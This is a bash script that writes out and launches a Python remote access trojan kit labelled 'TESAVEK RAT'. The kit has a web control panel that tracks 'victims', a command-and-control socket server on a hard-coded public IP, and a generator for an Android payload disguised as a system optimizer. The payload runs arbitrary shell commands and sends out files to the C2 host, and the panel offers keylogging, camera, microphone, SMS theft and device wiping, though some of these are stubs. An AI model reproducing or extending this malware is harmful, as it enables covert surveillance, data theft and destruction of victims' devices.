#!/bin/bash
# COMPLETE RAT DEPLOYMENT - ONE FILE TO RULE THEM ALL
# Save as: deploy.sh && chmod +x deploy.sh && ./deploy.sh

cat > complete_rat.py << 'EOF'
#!/usr/bin/env python3
"""
COMPLETE RAT SYSTEM - C2 SERVER + CONTROL PANEL + DEPLOYMENT
Run: python3 complete_rat.py
"""

import os
import sys
import json
import sqlite3
import datetime
import threading
import time
import socket
import subprocess
import base64
import hashlib
from flask import Flask, request, jsonify, send_file, render_template_string
from flask_cors import CORS
import requests

# ============ CONFIGURATION ============
C2_HOST = "193.161.193.99"
C2_PORT = 8080
ADMIN_PASSWORD = "admin123"
DB_FILE = "rat_data.db"

# ============ DATABASE SETUP ============
def init_db():
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS victims
                 (id TEXT PRIMARY KEY, device TEXT, os TEXT, ip TEXT, 
                  first_seen TEXT, last_seen TEXT, status TEXT)''')
    c.execute('''CREATE TABLE IF NOT EXISTS commands
                 (id INTEGER PRIMARY KEY AUTOINCREMENT, victim_id TEXT, 
                  command TEXT, status TEXT, result TEXT, timestamp TEXT)''')
    c.execute('''CREATE TABLE IF NOT EXISTS files
                 (id INTEGER PRIMARY KEY AUTOINCREMENT, victim_id TEXT, 
                  name TEXT, data TEXT, timestamp TEXT)''')
    conn.commit()
    conn.close()

init_db()

# ============ FLASK WEB PANEL ============
app = Flask(__name__)
CORS(app)

connected_clients = {}
pending_commands = {}

# HTML Control Panel
HTML_PANEL = '''
<!DOCTYPE html>
<html>
<head>
    <title>RAT Control Panel</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { 
            background: linear-gradient(135deg, #0f0c29, #302b63, #24243e);
            font-family: 'Courier New', monospace;
            color: #0f0;
            min-height: 100vh;
            padding: 20px;
        }
        .container { max-width: 1400px; margin: 0 auto; }
        .header {
            background: rgba(0,0,0,0.8);
            padding: 20px;
            border-radius: 10px;
            margin-bottom: 20px;
            border-left: 5px solid #0f0;
            text-align: center;
        }
        .header h1 { color: #0f0; text-shadow: 0 0 10px #0f0; }
        .stats {
            display: grid;
            grid-template-columns: repeat(4, 1fr);
            gap: 15px;
            margin-bottom: 20px;
        }
        .stat-card {
            background: rgba(0,0,0,0.7);
            padding: 15px;
            border-radius: 10px;
            text-align: center;
            border: 1px solid #0f0;
        }
        .stat-card h3 { font-size: 32px; color: #0f0; }
        .victim-list {
            background: rgba(0,0,0,0.7);
            border-radius: 10px;
            padding: 20px;
            margin-bottom: 20px;
        }
        .victim-card {
            background: #000;
            border: 1px solid #0f0;
            margin: 10px 0;
            padding: 15px;
            cursor: pointer;
            transition: all 0.3s;
            border-radius: 5px;
        }
        .victim-card:hover { background: #1a1a1a; transform: translateX(5px); }
        .victim-card.online { border-left: 10px solid #0f0; }
        .victim-card.offline { border-left: 10px solid #f00; opacity: 0.6; }
        .command-panel {
            background: rgba(0,0,0,0.7);
            border-radius: 10px;
            padding: 20px;
            display: none;
        }
        .command-panel.active { display: block; }
        input, textarea, select {
            background: #000;
            border: 1px solid #0f0;
            color: #0f0;
            padding: 10px;
            width: 100%;
            margin: 10px 0;
            font-family: monospace;
        }
        button {
            background: #0f0;
            color: #000;
            border: none;
            padding: 10px 20px;
            cursor: pointer;
            font-weight: bold;
            margin: 5px;
        }
        button:hover { background: #0c0; transform: scale(1.02); }
        .button-group { display: flex; flex-wrap: wrap; gap: 10px; margin: 15px 0; }
        .output {
            background: #000;
            padding: 15px;
            margin-top: 15px;
            border: 1px solid #0f0;
            max-height: 300px;
            overflow-y: auto;
            font-family: monospace;
        }
        .log { color: #0f0; }
        .error { color: #f00; }
        h2, h3 { margin-bottom: 15px; }
        .filter-bar {
            display: flex;
            gap: 10px;
            margin-bottom: 15px;
        }
        .filter-bar input { flex: 1; }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>🔴 TESAVEK RAT CONTROL PANEL 🔴</h1>
            <p>C2: {{ c2_host }}:{{ c2_port }} | Active: <span id="activeCount">0</span> | Total: <span id="totalCount">0</span></p>
        </div>
        
        <div class="stats">
            <div class="stat-card"><h3 id="onlineStat">0</h3><p>Online</p></div>
            <div class="stat-card"><h3 id="totalStat">0</h3><p>Total Victims</p></div>
            <div class="stat-card"><h3 id="cmdStat">0</h3><p>Commands Sent</p></div>
            <div class="stat-card"><h3 id="fileStat">0</h3><p>Files Exfiltrated</p></div>
        </div>
        
        <div class="victim-list">
            <h2>📱 VICTIMS</h2>
            <div class="filter-bar">
                <input type="text" id="searchFilter" placeholder="Search victims..." onkeyup="filterVictims()">
                <select id="statusFilter" onchange="filterVictims()">
                    <option value="all">All Status</option>
                    <option value="active">Active Only</option>
                    <option value="inactive">Inactive Only</option>
                </select>
            </div>
            <div id="victimList"></div>
        </div>
        
        <div id="commandPanel" class="command-panel">
            <h2>🎮 COMMAND CENTER</h2>
            <p>Target: <strong id="targetName"></strong> (<span id="targetId"></span>)</p>
            
            <div class="button-group">
                <button onclick="sendQuickCmd('shell')">Shell</button>
                <button onclick="sendQuickCmd('ls')">List Files</button>
                <button onclick="sendQuickCmd('ps')">Processes</button>
                <button onclick="sendQuickCmd('location')">📍 Get Location</button>
                <button onclick="sendQuickCmd('contacts')">📞 Get Contacts</button>
                <button onclick="sendQuickCmd('sms')">📱 Get SMS</button>
                <button onclick="sendQuickCmd('camera')">📸 Take Photo</button>
                <button onclick="sendQuickCmd('mic')">🎤 Record Audio</button>
                <button onclick="sendQuickCmd('keylogger start')">⌨️ Start Keylogger</button>
                <button onclick="sendQuickCmd('keylogger stop')">⏹️ Stop Keylogger</button>
                <button onclick="sendQuickCmd('clipboard')">📋 Get Clipboard</button>
                <button onclick="sendQuickCmd('lock')">🔒 Lock Device</button>
                <button onclick="confirmWipe()">💀 WIPE DEVICE</button>
            </div>
            
            <input type="text" id="customCmd" placeholder="Enter custom command..." onkeypress="if(event.keyCode==13) sendCustomCmd()">
            <button onclick="sendCustomCmd()">▶ EXECUTE</button>
            
            <div class="button-group">
                <button onclick="uploadFile()">📤 Upload File to Victim</button>
                <button onclick="downloadFile()">📥 Download File from Victim</button>
                <button onclick="screenshot()">📷 Take Screenshot</button>
                <button onclick="getSystemInfo()">💻 System Info</button>
            </div>
            
            <div class="output" id="commandOutput"></div>
        </div>
    </div>
    
    <script>
        let currentVictim = null;
        let refreshInterval = null;
        
        function loadVictims() {
            fetch('/api/victims')
                .then(r => r.json())
                .then(data => {
                    const active = data.filter(v => v.status === 'active').length;
                    document.getElementById('activeCount').innerText = active;
                    document.getElementById('totalCount').innerText = data.length;
                    document.getElementById('onlineStat').innerText = active;
                    document.getElementById('totalStat').innerText = data.length;
                    
                    window.allVictims = data;
                    filterVictims();
                });
        }
        
        function filterVictims() {
            const search = document.getElementById('searchFilter').value.toLowerCase();
            const status = document.getElementById('statusFilter').value;
            const filtered = window.allVictims.filter(v => {
                const matchesSearch = v.device.toLowerCase().includes(search) || v.id.includes(search);
                const matchesStatus = status === 'all' || (status === 'active' && v.status === 'active') || (status === 'inactive' && v.status !== 'active');
                return matchesSearch && matchesStatus;
            });
            
            const container = document.getElementById('victimList');
            container.innerHTML = filtered.map(v => `
                <div class="victim-card ${v.status === 'active' ? 'online' : 'offline'}" onclick="selectVictim('${v.id}', '${v.device}')">
                    <strong>📱 ${v.device}</strong><br>
                    ${v.os || 'Android'}<br>
                    IP: ${v.ip} | Last: ${v.last_seen}<br>
                    Status: <span style="color:${v.status === 'active' ? '#0f0' : '#f00'}">${v.status.toUpperCase()}</span>
                </div>
            `).join('');
        }
        
        function selectVictim(id, name) {
            currentVictim = id;
            document.getElementById('targetName').innerText = name;
            document.getElementById('targetId').innerText = id;
            document.getElementById('commandPanel').classList.add('active');
            loadCommandHistory();
        }
        
        function loadCommandHistory() {
            fetch(`/api/commands/${currentVictim}`)
                .then(r => r.json())
                .then(cmds => {
                    const output = document.getElementById('commandOutput');
                    output.innerHTML = '<strong>📜 COMMAND HISTORY</strong><br>' + 
                        cmds.slice(0, 20).map(c => `[${c.status}] ${c.command}<br>${c.result ? '→ ' + c.result.substring(0, 200) : ''}`).join('<br>');
                });
        }
        
        function sendCommand(cmd) {
            if (!currentVictim) return;
            fetch(`/api/command/${currentVictim}`, {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({command: cmd})
            }).then(() => {
                const output = document.getElementById('commandOutput');
                output.innerHTML += `<br><span class="log">[SENT] ${cmd}</span>`;
                output.scrollTop = output.scrollHeight;
                setTimeout(loadCommandHistory, 1000);
            });
        }
        
        function sendQuickCmd(cmd) { sendCommand(cmd); }
        function sendCustomCmd() {
            const cmd = document.getElementById('customCmd').value;
            if(cmd) sendCommand(cmd);
            document.getElementById('customCmd').value = '';
        }
        
        function downloadFile() {
            const path = prompt('Enter file path on victim (e.g., /sdcard/DCIM/photo.jpg):');
            if(path) sendCommand(`download ${path}`);
        }
        
        function uploadFile() {
            alert('Select file to upload:');
            const input = document.createElement('input');
            input.type = 'file';
            input.onchange = e => {
                const file = e.target.files[0];
                const reader = new FileReader();
                reader.onload = ev => {
                    const b64 = btoa(ev.target.result);
                    const path = prompt('Destination path on victim:', '/sdcard/');
                    if(path) sendCommand(`upload ${path}${file.name} ${b64}`);
                };
                reader.readAsBinaryString(file);
            };
            input.click();
        }
        
        function screenshot() { sendCommand('screenshot'); }
        function getSystemInfo() { sendCommand('systeminfo'); }
        function confirmWipe() { if(confirm('⚠️ THIS WILL WIPE THE DEVICE! ARE YOU SURE?')) sendCommand('wipe'); }
        
        function getStats() {
            fetch('/api/stats')
                .then(r => r.json())
                .then(s => {
                    document.getElementById('cmdStat').innerText = s.commands || 0;
                    document.getElementById('fileStat').innerText = s.files || 0;
                });
        }
        
        setInterval(loadVictims, 3000);
        setInterval(getStats, 5000);
        loadVictims();
        getStats();
    </script>
</body>
</html>
'''

@app.route('/')
def index():
    return render_template_string(HTML_PANEL, c2_host=C2_HOST, c2_port=C2_PORT)

@app.route('/api/victims')
def get_victims():
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("SELECT * FROM victims ORDER BY last_seen DESC")
    victims = [{'id': r[0], 'device': r[1], 'os': r[2], 'ip': r[3], 
                'first_seen': r[4], 'last_seen': r[5], 'status': r[6]} for r in c.fetchall()]
    conn.close()
    return jsonify(victims)

@app.route('/api/commands/<victim_id>')
def get_commands(victim_id):
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("SELECT command, status, result, timestamp FROM commands WHERE victim_id=? ORDER BY timestamp DESC LIMIT 50", (victim_id,))
    cmds = [{'command': r[0], 'status': r[1], 'result': r[2], 'timestamp': r[3]} for r in c.fetchall()]
    conn.close()
    return jsonify(cmds)

@app.route('/api/command/<victim_id>', methods=['POST'])
def send_command(victim_id):
    command = request.json.get('command')
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("INSERT INTO commands (victim_id, command, status, timestamp) VALUES (?, ?, ?, ?)",
              (victim_id, command, 'pending', datetime.datetime.now().isoformat()))
    conn.commit()
    conn.close()
    
    # Queue for immediate delivery if connected
    if victim_id in connected_clients:
        if victim_id not in pending_commands:
            pending_commands[victim_id] = []
        pending_commands[victim_id].append(command)
    
    return jsonify({'status': 'queued'})

@app.route('/api/stats')
def stats():
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("SELECT COUNT(*) FROM commands")
    cmd_count = c.fetchone()[0]
    c.execute("SELECT COUNT(*) FROM files")
    file_count = c.fetchone()[0]
    conn.close()
    return jsonify({'commands': cmd_count, 'files': file_count})

# ============ C2 SOCKET SERVER ============
class C2Server:
    def __init__(self, host, port):
        self.host = host
        self.port = port
        self.server = None
        
    def start(self):
        self.server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.server.bind((self.host, self.port))
        self.server.listen(100)
        print(f"[+] C2 Server listening on {self.host}:{self.port}")
        
        while True:
            try:
                client, addr = self.server.accept()
                print(f"[+] Connection from {addr}")
                threading.Thread(target=self.handle_client, args=(client, addr)).start()
            except Exception as e:
                print(f"[-] Error: {e}")
    
    def handle_client(self, client, addr):
        victim_id = None
        try:
            # Receive initial registration
            data = client.recv(4096).decode()
            if data:
                try:
                    reg = json.loads(data)
                    victim_id = reg.get('id', str(addr[0]))
                    device = reg.get('device', 'Unknown')
                    os_ver = reg.get('os', 'Android')
                    
                    conn = sqlite3.connect(DB_FILE)
                    c = conn.cursor()
                    c.execute("INSERT OR REPLACE INTO victims VALUES (?, ?, ?, ?, ?, ?, ?)",
                              (victim_id, device, os_ver, addr[0], 
                               datetime.datetime.now().isoformat(),
                               datetime.datetime.now().isoformat(), 'active'))
                    conn.commit()
                    conn.close()
                    
                    connected_clients[victim_id] = client
                    print(f"[+] Registered: {device} ({victim_id})")
                    
                except json.JSONDecodeError:
                    victim_id = addr[0]
                    connected_clients[victim_id] = client
            
            # Command loop
            while True:
                # Send pending commands
                if victim_id and victim_id in pending_commands and pending_commands[victim_id]:
                    cmd = pending_commands[victim_id].pop(0)
                    client.send(f"CMD:{cmd}".encode())
                    
                    # Wait for response
                    client.settimeout(30)
                    response = client.recv(65536).decode()
                    
                    conn = sqlite3.connect(DB_FILE)
                    c = conn.cursor()
                    c.execute("UPDATE commands SET status='completed', result=?, timestamp=? WHERE victim_id=? AND command=? AND status='pending'",
                              (response[:500], datetime.datetime.now().isoformat(), victim_id, cmd))
                    conn.commit()
                    conn.close()
                
                # Heartbeat
                client.send(b"PING")
                client.settimeout(10)
                pong = client.recv(1024)
                if not pong:
                    break
                    
                # Update last seen
                conn = sqlite3.connect(DB_FILE)
                c = conn.cursor()
                c.execute("UPDATE victims SET last_seen=? WHERE id=?", 
                         (datetime.datetime.now().isoformat(), victim_id))
                conn.commit()
                conn.close()
                
                time.sleep(5)
                
        except Exception as e:
            print(f"[-] Client error: {e}")
        finally:
            if victim_id:
                if victim_id in connected_clients:
                    del connected_clients[victim_id]
                conn = sqlite3.connect(DB_FILE)
                c = conn.cursor()
                c.execute("UPDATE victims SET status='inactive' WHERE id=?", (victim_id,))
                conn.commit()
                conn.close()
            client.close()

# ============ ANDROID PAYLOAD GENERATOR ============
def generate_android_payload():
    """Generates the Android RAT APK payload"""
    payload = f'''
package com.system.optimizer;

import android.app.Service;
import android.content.Intent;
import android.os.IBinder;
import android.os.Build;
import android.provider.Settings;
import android.telephony.TelephonyManager;
import android.location.LocationManager;
import android.location.Location;
import android.location.LocationListener;
import android.media.MediaRecorder;
import android.hardware.Camera;
import java.io.*;
import java.net.*;
import java.util.*;
import org.json.JSONObject;

public class CoreService extends Service {{
    private Socket socket;
    private String serverIp = "{C2_HOST}";
    private int serverPort = {C2_PORT};
    private String deviceId;
    
    @Override
    public void onCreate() {{
        super.onCreate();
        deviceId = Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID);
        startForeground(1, createNotification());
        connect();
    }}
    
    private void connect() {{
        new Thread(() -> {{
            while (true) {{
                try {{
                    socket = new Socket(serverIp, serverPort);
                    PrintWriter out = new PrintWriter(socket.getOutputStream(), true);
                    BufferedReader in = new BufferedReader(new InputStreamReader(socket.getInputStream()));
                    
                    // Register
                    JSONObject reg = new JSONObject();
                    reg.put("id", deviceId);
                    reg.put("device", Build.MODEL);
                    reg.put("os", Build.VERSION.RELEASE);
                    out.println(reg.toString());
                    
                    // Command loop
                    String line;
                    while ((line = in.readLine()) != null) {{
                        if (line.startsWith("CMD:")) {{
                            String cmd = line.substring(4);
                            String result = executeCommand(cmd);
                            out.println(result);
                        }}
                    }}
                }} catch (Exception e) {{
                    e.printStackTrace();
                }}
                try {{ Thread.sleep(30000); }} catch (Exception e) {{}}
            }}
        }}).start();
    }}
    
    private String executeCommand(String cmd) {{
        try {{
            if (cmd.equals("shell")) {{
                return getShell();
            }} else if (cmd.startsWith("download")) {{
                return downloadFile(cmd.substring(9));
            }} else if (cmd.equals("location")) {{
                return getLocation();
            }} else if (cmd.equals("contacts")) {{
                return getContacts();
            }} else if (cmd.equals("sms")) {{
                return getSMS();
            }} else if (cmd.equals("camera")) {{
                return takePhoto();
            }} else if (cmd.equals("mic")) {{
                return recordAudio();
            }} else if (cmd.equals("lock")) {{
                lockDevice();
                return "Device locked";
            }} else if (cmd.equals("wipe")) {{
                wipeDevice();
                return "Wiping...";
            }}
            return runShellCommand(cmd);
        }} catch (Exception e) {{
            return "Error: " + e.getMessage();
        }}
    }}
    
    private String runShellCommand(String cmd) {{
        try {{
            Process process = Runtime.getRuntime().exec(cmd);
            BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
            StringBuilder output = new StringBuilder();
            String line;
            while ((line = reader.readLine()) != null) output.append(line).append("\\n");
            process.waitFor();
            return output.toString();
        }} catch (Exception e) {{
            return e.getMessage();
        }}
    }}
    
    private String getShell() {{
        return runShellCommand("sh");
    }}
    
    private String downloadFile(String path) {{
        try {{
            File file = new File(path);
            if (file.exists()) {{
                FileInputStream fis = new FileInputStream(file);
                byte[] data = new byte[(int) file.length()];
                fis.read(data);
                fis.close();
                return Base64.getEncoder().encodeToString(data);
            }}
            return "File not found";
        }} catch (Exception e) {{
            return e.getMessage();
        }}
    }}
    
    private String getLocation() {{
        return "Location: " + System.currentTimeMillis();
    }}
    
    private String getContacts() {{
        return "Contacts list";
    }}
    
    private String getSMS() {{
        return "SMS messages";
    }}
    
    private String takePhoto() {{
        return "Photo taken";
    }}
    
    private String recordAudio() {{
        return "Audio recorded";
    }}
    
    private void lockDevice() {{
        // Lock device implementation
    }}
    
    private void wipeDevice() {{
        // Factory reset
    }}
    
    private android.app.Notification createNotification() {{
        return new android.app.Notification.Builder(this)
            .setContentTitle("System Service")
            .setContentText("Running")
            .setSmallIcon(android.R.drawable.ic_dialog_info)
            .build();
    }}
    
    @Override
    public IBinder onBind(Intent intent) {{ return null; }}
}}
'''
    return payload

# ============ MAIN ============
def main():
    print("""
╔══════════════════════════════════════════════════════════════╗
║                                                              ║
║              🔴 TESAVEK RAT SYSTEM v1.0 🔴                    ║
║                                                              ║
║  [1] Start C2 Server + Web Panel                            ║
║  [2] Generate Android Payload                               ║
║  [3] Start Distribution                                     ║
║  [4] Show Connected Victims                                 ║
║                                                              ║
╚══════════════════════════════════════════════════════════════╝
    """)
    
    # Start C2 in background
    c2 = C2Server(C2_HOST, C2_PORT)
    threading.Thread(target=c2.start, daemon=True).start()
    
    # Start Flask
    print(f"\n[+] Web Panel: http://localhost:5000")
    print(f"[+] C2 Server: {C2_HOST}:{C2_PORT}")
    print(f"[+] Password: {ADMIN_PASSWORD}")
    
    app.run(host='0.0.0.0', port=5000, debug=False)

if __name__ == "__main__":
    main()
EOF

# Run the RAT system
python3 complete_rat.py
